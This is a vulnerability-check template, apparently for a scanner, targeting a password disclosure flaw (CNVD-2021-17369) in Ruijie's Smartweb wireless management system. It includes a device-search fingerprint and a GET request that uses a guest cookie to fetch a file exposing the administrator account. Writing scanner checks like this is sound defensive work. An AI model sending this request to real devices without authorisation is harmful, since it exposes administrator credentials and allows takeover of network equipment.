name: Ruijie_Smartweb_Management_System_Password_Information_Disclosure_CNVD_2021_17369
transport: http
set: {}
detail:
  dock: app="Ruijie-WiFi" && title="无线smartWeb--登录页面"
  product: Ruijie Smartweb Management System
  homepage: http://www.ruijie.com.cn/
  impact: The wireless smartweb management system of Ruijie Networks Co., Ltd. has
    a logic flaw. An attacker can obtain the administrator account and password from
    a low-privileged user, thereby escalating the low-level privilege to the administrator's
    privilege.
  description: Ruijie Networks Co., Ltd. is a provider of ICT infrastructure and industry
    solutions. Its main business is R&D, design and sales of network equipment, network
    security products and cloud desktop solutions.
rules:
  r1:
    method: GET
    path: /web/xml/webuser-auth.xml
    follow_redirects: false
    headers:
      Cookie: login=1; oid=1.3.6.1.4.1.4881.1.1.10.1.3; type=WS5302; auth=Z3Vlc3Q6Z3Vlc3Q%3D;
        user=guest
    expression: response.status == 200 && response.body.bcontains(b'&lt;![CDATA[   admin]]&gt;')
expression: r1()
